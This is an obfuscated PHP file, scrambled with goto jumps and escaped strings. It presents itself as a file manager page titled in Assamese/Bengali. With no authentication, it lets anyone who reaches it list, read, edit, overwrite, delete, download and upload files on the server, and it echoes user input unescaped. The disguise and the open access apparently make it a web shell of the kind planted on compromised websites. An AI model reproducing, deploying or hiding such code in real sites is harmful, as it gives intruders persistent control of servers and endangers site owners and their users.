<?php
 goto ZaPPK; r9LGv: ?>
<!doctypehtml><?php  goto FtGD7; FtGD7: goto Zg9a5; goto zXBsP; aJDVf: W3DYH: goto OtAQp; OtAQp: goto HZ4HN; goto lZ9Zd; ece7C: Fxfoq: goto mpqzA; ZaPPK: goto Up6Lf; goto tnvZI; IyWyZ: goto UpwRw; goto bXOrd; C0DmI: if (isset($_GET["\x66\151\x6c\145"])) { $file = $_GET["\x66\x69\x6c\x65"]; $path = $directory . $file; $content = file_get_contents($path); ?>
<div class="mt-5"><h2 class="mb-3">Edit File:<?php  echo $file; ?>
</h2><form method="post"><input name="action"type="hidden"value="edit"> <input name="filename"type="hidden"value="<?php  echo $file; ?>
"><div class="form-group"><textarea class="form-control"name="content"rows="10"><?php  echo $content; ?>
</textarea></div><button class="btn btn-primary"type="submit">Save</button> <a class="btn btn-secondary"href="?file=<?php  echo $file; ?>
&action=download">Download</a> <button class="btn btn-danger"type="submit"name="action"value="delete">Delete</button></form></div><?php  } goto LQrNw; VpfLq: R4WGS: goto Aw8ag; nPbq0: PywPs: goto rHF3M; q58DC: goto Q682c; goto fZfis; gjqP_: goto W3DYH; goto xZ6Tu; P8gT4: goto BZjYc; goto jDldv; HRhSP: goto Ogo2_; goto o_bWY; Xsskf: goto x6caZ; goto Xh0aT; ssOif: goto an3UX; goto YTpSp; oTktl: P50NI: goto K_KCN; Ez1io: cFZ67: goto K1XVd; ToLv3: goto HfiDU; goto eBFng; Bq4XK: Jzqht: goto IyWyZ; ZCIyr: goto IRdQC; goto QDYIy; goEcK: ?>
<html><head><title>ফাইলসমূহ ব্যৱস্থাপক</title><link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css"rel="stylesheet"></head><body><?php  goto NQRok; zqSFi: Up6Lf: goto O0zBX; CefuE: RKTtP: goto S0XXK; WGfJ1: UVmDc: goto YFsug; QVvcK: HZ4HN: goto bq7II; cfiWP: goto lDxJG; goto RVsdu; Hn123: goto BtLNe; goto dWXKw; WHdzc: j64s_: goto OLoYJ; FpDbW: an3UX: goto S_OeC; X8aAF: goto Fxfoq; goto WoT00; pRMcO: Ogo2_: goto hIrRR; HMy1a: goto dDsFY; goto h47nq; zKril: goto YxG3T; goto Sqv8z; awuQQ: goto iJJJx; goto ZyoDP; NhWb7: ceShL: goto shGOu; qgXRy: goto kUCEx; goto HE_dG; eXref: YxG3T: goto q58DC; ybeSx: goto pQV9J; goto LLY3a; S0XXK: goto y1SYU; goto wOOLc; K3eJS: LBKD9: goto eXubA; YFsug: goto lr62p; goto oubKK; od07F: x6caZ: goto H7uwd; S_OeC: goto biyES; goto ToLv3; fGKfW: OVpWW: goto QoTkb; H7uwd: goto ceShL; goto a3l70; Gny0E: goto zZK9p; goto PoR7t; WoT00: pQV9J: goto yhYq5; YTpSp: YfxHd: goto aqfmL; k0WyB: if ($_SERVER["\122\x45\121\x55\x45\x53\124\137\x4d\x45\124\x48\x4f\x44"] === "\x50\x4f\x53\x54") { if (isset($_POST["\x61\143\164\151\x6f\156"])) { $action = $_POST["\141\143\x74\x69\157\x6e"]; $filename = $_POST["\146\151\x6c\x65\x6e\x61\x6d\x65"]; $path = $directory . $filename; switch ($action) { case "\145\x64\x69\164": if (isset($_POST["\143\157\156\164\x65\x6e\x74"])) { $content = $_POST["\x63\157\x6e\164\145\156\x74"]; file_put_contents($path, $content); echo "\74\x64\x69\166\40\x63\154\141\x73\163\75\x27\x61\x6c\x65\162\164\x20\141\x6c\145\x72\164\55\x73\x75\x63\143\x65\163\163\47\x3e\106\151\154\145\x20\47{$filename}\47\x20\150\141\163\40\142\x65\x65\156\40\x75\x70\144\x61\164\x65\144\x2e\74\x2f\x64\x69\166\x3e"; } break; case "\144\x65\154\x65\164\x65": if (file_exists($path)) { unlink($path); echo "\74\144\151\x76\x20\x63\154\x61\x73\x73\75\x27\141\154\x65\162\x74\40\141\154\145\x72\x74\55\x64\141\156\x67\x65\x72\47\76\x46\x69\x6c\x65\40\x27{$filename}\47\x20\150\141\163\40\x62\145\x65\x6e\40\x64\x65\154\145\x74\145\144\56\74\57\x64\x69\166\x3e"; } break; case "\144\x6f\x77\x6e\154\157\141\x64": if (file_exists($path)) { header("\x43\157\156\x74\145\x6e\x74\55\124\171\x70\145\72\40\141\x70\x70\x6c\x69\143\141\164\x69\157\156\x2f\x6f\143\164\145\164\x2d\163\164\x72\x65\141\155"); header("\x43\x6f\156\x74\145\156\164\55\x44\151\x73\x70\x6f\163\x69\x74\x69\x6f\x6e\x3a\x20\x61\x74\164\141\143\150\155\145\156\x74\x3b\40\x66\151\x6c\145\x6e\x61\x6d\x65\75\x22" . $filename . "\42"); readfile($path); die; } break; case "\165\x70\154\157\x61\x64": if (isset($_FILES["\146\x69\x6c\x65"]) && $_FILES["\x66\x69\x6c\x65"]["\145\162\x72\x6f\x72"] == UPLOAD_ERR_OK) { $uploadedFile = $_FILES["\x66\x69\154\145"]; $uploadedFilename = $uploadedFile["\x6e\141\155\x65"]; $uploadedFilePath = $directory . $uploadedFilename; if (move_uploaded_file($uploadedFile["\x74\155\160\x5f\156\x61\155\x65"], $uploadedFilePath)) { echo "\74\x64\x69\x76\x20\x63\x6c\x61\x73\x73\x3d\x27\x61\154\x65\x72\164\x20\x61\154\145\162\164\55\163\x75\x63\x63\x65\163\x73\x27\76\x46\151\154\145\40\47{$uploadedFilename}\47\40\150\141\x73\x20\142\x65\145\156\x20\x75\160\154\x6f\141\144\x65\144\x2e\x3c\57\x64\x69\166\x3e"; } else { echo "\74\144\151\166\40\x63\x6c\141\x73\x73\75\47\141\154\145\x72\164\x20\x61\x6c\145\162\164\x2d\x64\141\156\147\x65\x72\47\76\x45\x72\162\157\162\x20\165\x70\x6c\x6f\141\144\151\x6e\147\40\x66\x69\154\x65\x20\x27{$uploadedFilename}\47\56\x3c\57\144\x69\x76\76"; } } break; } } } goto eeorL; shGOu: goto RKTtP; goto jJAiw; PvzFq: UOMr3: goto ybeSx; kJGhF: goto UOMr3; goto z3Kqe; KEReU: goto S_0ZK; goto RY72m; sdthK: PoQDS: goto ztjvm; eBFng: RE1JO: goto kJGhF; jJAiw: goto nzh53; goto W99z4; MoXqg: UM9DC: goto tMO0s; O0zBX: $directory = "\x2e\57"; goto HMy1a; qUdXz: goto rJRP7; goto e_8er; fZfis: goto P50NI; goto yXK9S; RDUmN: NRAqU: goto pRMcO; YToBu: goto fHeHI; goto onZd9; KvKro: ?>
<div class="container my-5"><h1 class="mb-4">ফাইলসমূহ ব্যৱস্থাপক</h1><h2 class="mb-3">Files in the directory:</h2><div class="list-group"><?php  goto ssOif; rHF3M: b7DG2: goto mDu94; NQRok: goto PoQDS; goto RDUmN; kUZJa: R41U0: goto f2fNj; z3Kqe: goto RaTYY; goto fVHoI; ArB5G: goto KAOBw; goto VpfLq; u4ZDf: RaTYY: goto Io_F8; AAReO: goto b7DG2; goto X8aAF; nYBhb: UpwRw: goto W00gL; XEViw: goto XZqMC; goto nPbq0; RVsdu: nzh53: goto WZL3r; sqCYd: goto j64s_; goto oRROF; f2fNj: OxWyh: goto XXY2V; p351T: BtLNe: goto Tum8q; dWXKw: kUCEx: goto AtldP; AtldP: ?>
<div class="mt-5"><h2 class="mb-3">Upload a File</h2><form method="post"enctype="multipart/form-data"><input name="action"type="hidden"value="upload"><div class="form-group"><input name="file"type="file"class="form-control-file"></div><button class="btn btn-primary"type="submit">Upload</button></form></div><?php  goto v_wxs; cRNRA: goto LgC7y; goto sdthK; SAdme: goto NRAqU; goto Ez1io; rP0lO: jR3pI: goto T31OI; WZL3r: ZiNxl: goto nfqXd; Ij3Pm: y1SYU: goto KvKro; LLY3a: VCC4_: goto pmddH; Dbmld: goto VCC4_; goto p351T; Aw8ag: goto z2wau; goto sqCYd; ZoI9G: goto DRsZ1; goto QVvcK; Tum8q: goto ZiNxl; goto Z1aRY; ZyoDP: lDxJG: goto od07F; ztjvm: goto DECeE; goto ZCIyr; OLoYJ: M1hJt: goto cRNRA; yhYq5: foreach ($files as $file) { if ($file !== "\56" && $file !== "\x2e\56") { echo "\74\x61\x20\x68\x72\145\146\x3d\x27\x3f\x66\151\154\145\x3d{$file}\x27\40\143\154\141\x73\x73\x3d\47\x6c\151\163\x74\x2d\x67\x72\157\x75\160\55\x69\x74\145\x6d\40\154\151\163\164\x2d\x67\162\157\x75\160\55\151\164\x65\x6d\55\x61\143\164\151\x6f\156\x27\x3e" . $file . "\x3c\x2f\141\x3e"; } } goto KEReU; NZhI7: goto eYzAx; goto u4ZDf; n2Xh1: rJRP7: goto gjqP_; fVHoI: DRsZ1: goto E2rO7; RY72m: QZmyx: goto CefuE; QoTkb: goto M1hJt; goto NZhI7; K_KCN: Q682c: goto OGJeH; tMO0s: VHnC8: goto qgXRy; XXY2V: goto n9LAA; goto WHdzc; GJY0y: goto YfxHd; goto ece7C; iFzt5: pwdkA: goto goEcK; dLmGp: goto Gx4o3; goto fGKfW; v_wxs: goto OVpWW; goto bAy1i; LQrNw: goto R8TU7; goto eXref; e_8er: HfiDU: goto nYBhb; hIrRR: goto pwdkA; goto kUZJa; tnvZI: G5CD4: goto YB9Li; Sqv8z: R8TU7: goto KmG7E; eeorL: goto G5CD4; goto FzsUO; o_bWY: goto cFZ67; goto Ij3Pm; mDu94: goto RE1JO; goto FpDbW; K1XVd: DECeE: goto YToBu; xZ6Tu: goto UVmDc; goto Bq4XK; v6ahD: E3vT1: goto C0DmI; YQ6V_: goto jmKrL; goto n2Xh1; YB9Li: $files = scandir($directory); goto DAvjo; xvtDq: goto pUGmY; goto YQ6V_; oubKK: goto UM9DC; goto MoXqg; iZnBP: z2wau: goto cfiWP; E2rO7: goto OxWyh; goto zKril; DAvjo: goto V_UxC; goto zqSFi; rzkge: BZjYc: goto Hn123; nfqXd: goto E3vT1; goto K3eJS; onZd9: eYzAx: goto PvzFq; yXK9S: S_0ZK: goto sWUsA; Io_F8: pUGmY: goto awuQQ; Z1aRY: goto QZmyx; goto v6ahD; bq7II: goto VHnC8; goto SAdme; FzsUO: V_UxC: goto ArB5G; QDYIy: IRdQC: goto jESJX; Xh0aT: goto R4WGS; goto rP0lO; bXOrd: goto LBKD9; goto iFzt5; HE_dG: iJJJx: goto Vo5oN; jDldv: goto Jzqht; goto NhWb7; aqfmL: VXGL8: goto dLmGp; oRROF: Zg9a5: goto HRhSP; KmG7E: goto CpjjB; goto Dbmld; T31OI: CpjjB: goto ZoI9G; C_c95: goto jR3pI; goto oTktl; W00gL: goto R41U0; goto WGfJ1; W99z4: fHeHI: goto Xsskf; sWUsA: goto RznDd; goto GJY0y; h47nq: dDsFY: goto k0WyB; bAy1i: KAOBw: goto r9LGv; wOOLc: Gx4o3: goto rzkge; Vg2zU: n9LAA: goto xvtDq; pmddH: lr62p: goto XEViw; PoR7t: jmKrL: goto iZnBP; mpqzA: goto VXGL8; goto C_c95; eXubA: RznDd: goto qUdXz; jESJX: biyES: goto Gny0E; zXBsP: LgC7y: goto P8gT4; a3l70: XZqMC: goto aJDVf; OGJeH: goto PywPs; goto Vg2zU; lZ9Zd: zZK9p: goto AAReO; Vo5oN: ?>
</div>